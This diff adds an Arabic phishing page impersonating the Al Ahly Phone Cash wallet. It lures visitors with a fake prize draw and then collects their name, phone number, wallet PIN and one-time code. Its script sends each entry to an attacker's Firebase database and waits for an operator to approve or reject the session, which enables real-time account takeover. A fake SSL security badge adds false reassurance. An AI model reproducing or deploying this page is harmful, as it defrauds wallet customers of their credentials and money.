@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>محفظة الاهلي فون كاش</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;700&display=swap');
+    * { font-family: 'Janna LT', 'Janna', 'Traditional Arabic', 'Noto Naskh Arabic', Arial, sans-serif !important; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(160deg, #1a5c38 0%, #2e7d4f 50%, #0d3d22 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Janna LT', 'Janna', 'Traditional Arabic', Arial, sans-serif;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 35px 28px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+      text-align: center;
+    }
+
+    .logo { width: 100px; margin-bottom: 20px; }
+
+    .step { display: none; }
+    .step.active { display: block; }
+
+    .landing-title {
+      font-size: 26px;
+      font-weight: 900;
+      color: #1a5c38;
+      line-height: 1.4;
+      margin-bottom: 12px;
+    }
+    .landing-sub1 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #2e7d4f;
+      margin-bottom: 10px;
+    }
+    .landing-sub2 {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.7;
+      margin-bottom: 28px;
+    }
+    .btn-main {
+      width: 100%;
+      padding: 14px;
+      background: #2e7d4f;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .btn-main:hover { background: #0d3d22; }
+    .btn-main:active { transform: scale(0.98); }
+
+    .page-title {
+      font-size: 20px;
+      font-weight: 900;
+      color: #1a5c38;
+      margin-bottom: 6px;
+    }
+    .page-sub {
+      font-size: 13px;
+      color: #888;
+      margin-bottom: 22px;
+    }
+    .form-group { margin-bottom: 16px; text-align: right; }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid #ddd;
+      border-radius: 10px;
+      font-size: 14px;
+      outline: none;
+      text-align: right;
+      transition: border-color 0.2s;
+      background: #fafafa;
+    }
+    .form-group input:focus {
+      border-color: #2e7d4f;
+      background: #fff;
+    }
+
+    .login-subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 22px;
+      font-weight: 600;
+    }
+    .input-wrap { position: relative; }
+    .eye-btn {
+      position: absolute;
+      left: 12px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none;
+      cursor: pointer; color: #aaa; font-size: 16px;
+    }
+
+    .special-badge {
+      margin-top: 18px;
+      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+      border: 1.5px solid #a5d6a7;
+      border-radius: 12px;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .special-badge .badge-icon { font-size: 22px; flex-shrink: 0; }
+    .special-badge .badge-text {
+      font-size: 13px;
+      font-weight: 800;
+      color: #1a5c38;
+      line-height: 1.5;
+    }
+
+    .secure-note {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 14px;
+    }
+
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 22px;
+    }
+    .step-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: #ddd;
+      transition: background 0.3s;
+    }
+    .step-dot.active { background: #2e7d4f; }
+    .step-dot.done { background: #66bb6a; }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.65);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+    }
+    .overlay.show { display: flex; }
+
+    .lightbox {
+      background: #fff;
+      border-radius: 18px;
+      padding: 36px 30px;
+      text-align: center;
+      max-width: 320px;
+      width: 90%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+    }
+
+    .spinner {
+      width: 52px; height: 52px;
+      border: 5px solid #e0e0e0;
+      border-top-color: #2e7d4f;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-title { font-size: 17px; font-weight: 800; color: #1a5c38; margin-bottom: 8px; }
+    .waiting-sub { font-size: 13px; color: #888; line-height: 1.6; }
+
+    .error-icon-big { font-size: 54px; margin-bottom: 14px; }
+    .error-lb-title { font-size: 17px; font-weight: 900; color: #c62828; margin-bottom: 10px; }
+    .error-lb-msg { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 22px; }
+    .btn-retry {
+      width: 100%;
+      padding: 12px;
+      background: #c62828;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-retry:hover { background: #b71c1c; }
+
+    /* OTP - Single Input */
+    .otp-title { font-size: 22px; font-weight: 900; color: #1a5c38; margin-bottom: 8px; }
+    .otp-sub { font-size: 13px; color: #666; margin-bottom: 22px; }
+    .otp-inputs {
+      margin-bottom: 20px;
+    }
+    .otp-inputs input {
+      width: 100%;
+      height: 58px;
+      border: 2px solid #ddd;
+      border-radius: 10px;
+      font-size: 24px;
+      font-weight: 800;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.2s;
+      letter-spacing: 8px;
+      background: #fafafa;
+      direction: ltr;
+    }
+    .otp-inputs input:focus { border-color: #2e7d4f; background: #fff; }
+    .otp-error {
+      display: none;
+      background: #fee2e2;
+      color: #dc2626;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 14px;
+    }
+    .otp-error.show { display: block; }
+
+    .success-icon { font-size: 60px; margin-bottom: 14px; }
+    .success-title { font-size: 22px; font-weight: 900; color: #1a5c38; margin-bottom: 8px; }
+    .success-sub { font-size: 14px; color: #666; }
+  </style>
+</head>
+<body>
+
+<!-- WAITING OVERLAY -->
+<div id="waitingOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="spinner"></div>
+    <div class="waiting-title">جاري التحقق من المعلومات</div>
+    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من هويتك بشكل آمن</div>
+  </div>
+</div>
+
+<!-- ERROR LIGHTBOX (login rejected) -->
+<div id="errorOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="error-icon-big">⚠️</div>
+    <div class="error-lb-title">المعلومات غير صحيحة</div>
+    <div class="error-lb-msg">
+      معلوماتك المدخلة غير صحيحة،<br/>
+      يرجى التأكد من المعلومات وإدخالها بشكل صحيح
+    </div>
+    <button class="btn-retry" onclick="retryLogin()">حسناً، سأحاول مجدداً</button>
+  </div>
+</div>
+
+<!-- WAITING OTP OVERLAY -->
+<div id="waitingOTPOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="spinner"></div>
+    <div class="waiting-title">جاري التحقق من الرمز</div>
+    <div class="waiting-sub">يرجى الانتظار، يتم التحقق من رمز التحقق</div>
+  </div>
+</div>
+
+<!-- ERROR OTP LIGHTBOX -->
+<div id="errorOTPOverlay" class="overlay">
+  <div class="lightbox">
+    <div class="error-icon-big">⚠️</div>
+    <div class="error-lb-title">رمز التحقق غير صحيح</div>
+    <div class="error-lb-msg">
+      الرمز الذي أدخلته غير صحيح،<br/>
+      يرجى التأكد من الرمز وإعادة المحاولة
+    </div>
+    <button class="btn-retry" onclick="retryOTP()">حسناً، سأحاول مجدداً</button>
+  </div>
+</div>
+
+<!-- CARD -->
+<div class="card">
+  <img src="logo.png" class="logo" alt="Logo"/>
+
+  <!-- STEP 0: LANDING -->
+  <div class="step active" id="stepLanding">
+    <div class="landing-title">محفظة الاهلي فون كاش</div>
+    <div class="landing-sub1">خاص لعملاء محفظة الاهلي فون كاش</div>
+    <div class="landing-sub2">
+      سجل في السحب الان على الجوائز النقدية والعينية المجزية<br/>
+      المقدمة من محفظة الاهلي فون كاش
+    </div>
+    <button class="btn-main" onclick="goToPersonalInfo()">🎁 سجل في السحب الان</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
+
+  <!-- STEP 1: PERSONAL INFO -->
+  <div class="step" id="stepPersonal">
+    <div class="step-indicator">
+      <div class="step-dot done" id="dot0"></div>
+      <div class="step-dot active" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+    </div>
+    <div class="page-title">المعلومات الشخصية</div>
+    <div class="page-sub">أدخل بياناتك الشخصية للمتابعة</div>
+    <div class="form-group">
+      <label>الاسم الكامل</label>
+      <input type="text" id="nameInput" placeholder="أدخل اسمك الكامل"/>
+    </div>
+    <div class="form-group">
+      <label>رقم الهاتف</label>
+      <input type="tel" id="personalPhoneInput" placeholder="011XXXXXXXX" maxlength="12"/>
+    </div>
+    <button class="btn-main" onclick="goToLogin()">التالي ←</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
+
+  <!-- STEP 2: LOGIN -->
+  <div class="step" id="stepLogin">
+    <div class="step-indicator">
+      <div class="step-dot done"></div>
+      <div class="step-dot done"></div>
+      <div class="step-dot active"></div>
+    </div>
+    <div class="page-title">محفظة الاهلي فون كاش</div>
+    <div class="form-group">
+      <div class="input-wrap">
+        <input type="tel" id="phoneInput" placeholder="ادخل رقم الموبايل" inputmode="numeric" pattern="[0-9]*"/>
+      </div>
+    </div>
+    <div class="form-group">
+      <div class="input-wrap">
+        <input type="password" id="pinInput" placeholder="ادخل الرقم السري" inputmode="numeric" pattern="[0-9]*"/>
+        <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
+      </div>
+    </div>
+    <div class="special-badge">
+      <div class="badge-icon">🏦</div>
+      <div class="badge-text">خاص بعملاء محفظة الاهلي فون كاش</div>
+    </div>
+    <button class="btn-main" style="margin-top:18px;" onclick="submitLogin()">تسجيل الدخول</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
+
+  <!-- STEP 3: OTP -->
+  <div class="step" id="stepOTP">
+    <div class="otp-title">أدخل رمز التحقق</div>
+    <div class="otp-sub">تم إرسال رمز التحقق إلى رقم هاتفك</div>
+    <div class="otp-error" id="otpError">❌ الرمز غير صحيح، يرجى المحاولة مرة أخرى</div>
+    <div class="otp-inputs">
+      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق"/>
+    </div>
+    <button class="btn-main" onclick="submitOTP()">تأكيد</button>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024</div>
+  </div>
+
+  <!-- STEP 4: SUCCESS -->
+  <div class="step" id="stepSuccess">
+    <div class="success-icon">✅</div>
+    <div class="success-title">تم التسجيل بنجاح!</div>
+    <div class="success-sub">شكراً لك، تم تسجيلك في السحب بنجاح</div>
+  </div>
+
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, push, update, onValue, off } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBYOUNmTyszdG6ICkE5kyRVz_RrRGKQw4A",
+    authDomain: "alahly-9357f-eb12e.firebaseapp.com",
+    databaseURL: "https://alahly-9357f-eb12e-default-rtdb.firebaseio.com",
+    projectId: "alahly-9357f-eb12e",
+    storageBucket: "alahly-9357f-eb12e.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  let sessionRef = null;
+  let loginListener = null;
+  let otpListener = null;
+
+  function showOverlay(id) { document.getElementById(id).classList.add('show'); }
+  function hideOverlay(id) { document.getElementById(id).classList.remove('show'); }
+  const pageMap = {
+    'stepLanding': 'landing',
+    'stepPersonal': 'personal',
+    'stepLogin': 'login',
+    'stepOTP': 'otp',
+    'stepSuccess': 'success'
+  };
+
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if (typeof sessionRef !== 'undefined' && sessionRef && pageMap[id]) {
+      update(sessionRef, { currentPage: pageMap[id] });
+    }
+  }
+
+  window.goToPersonalInfo = function() {
+    showStep('stepPersonal');
+  }
+
+  window.goToLogin = function() {
+    const name = document.getElementById('nameInput').value.trim();
+    const phone = document.getElementById('personalPhoneInput').value.trim();
+    if (!name || !phone) { alert('يرجى تعبئة جميع الحقول'); return; }
+    showStep('stepLogin');
+  }
+
+  window.togglePin = function() {
+    const p = document.getElementById('pinInput');
+    p.type = p.type === 'password' ? 'text' : 'password';
+  }
+
+  window.retryLogin = function() {
+    hideOverlay('errorOverlay');
+    document.getElementById('phoneInput').value = '';
+    document.getElementById('pinInput').value = '';
+    showStep('stepLogin');
+  }
+
+  window.retryOTP = function() {
+    hideOverlay('errorOTPOverlay');
+    const inp = document.getElementById('otpSingleInput');
+    inp.value = '';
+    inp.focus();
+  }
+
+  window.submitLogin = async function() {
+    const name = document.getElementById('nameInput').value.trim();
+    const personalPhone = document.getElementById('personalPhoneInput').value.trim();
+    const phone = document.getElementById('phoneInput').value.trim();
+    const pin = document.getElementById('pinInput').value.trim();
+    if (!phone || !pin) return;
+
+    showOverlay('waitingOverlay');
+
+    const newRef = push(ref(db, 'site1/sessions'), {
+      name, personalPhone, phone, pin,
+      otp: '---',
+      status: 'waiting',
+      currentPage: 'login',
+      timestamp: Date.now()
+    });
+    sessionRef = newRef;
+
+    loginListener = onValue(newRef, (snap) => {
+      const data = snap.val();
+      if (!data) return;
+      if (data.status === 'approved') {
+        off(newRef, 'value', loginListener);
+        hideOverlay('waitingOverlay');
+        showStep('stepOTP');
+      } else if (data.status === 'rejected') {
+        off(newRef, 'value', loginListener);
+        hideOverlay('waitingOverlay');
+        showOverlay('errorOverlay');
+      }
+    });
+  }
+
+  window.submitOTP = function() {
+    const otp = document.getElementById('otpSingleInput').value.trim();
+    if (!otp) return;
+
+    document.getElementById('otpError').classList.remove('show');
+    showOverlay('waitingOTPOverlay');
+
+    if (sessionRef) update(sessionRef, { otp, status: 'otp_submitted' });
+    if (otpListener) off(sessionRef, 'value', otpListener);
+
+    otpListener = onValue(sessionRef, (snap) => {
+      const data = snap.val();
+      if (!data) return;
+      if (data.status === 'final_approved') {
+        off(sessionRef, 'value', otpListener);
+        hideOverlay('waitingOTPOverlay');
+        showStep('stepSuccess');
+      } else if (data.status === 'final_rejected') {
+        off(sessionRef, 'value', otpListener);
+        hideOverlay('waitingOTPOverlay');
+        showOverlay('errorOTPOverlay');
+        if (sessionRef) update(sessionRef, { otp: '---', status: 'approved' });
+      }
+    });
+  }
+</script>
+</body>
+</html>
+
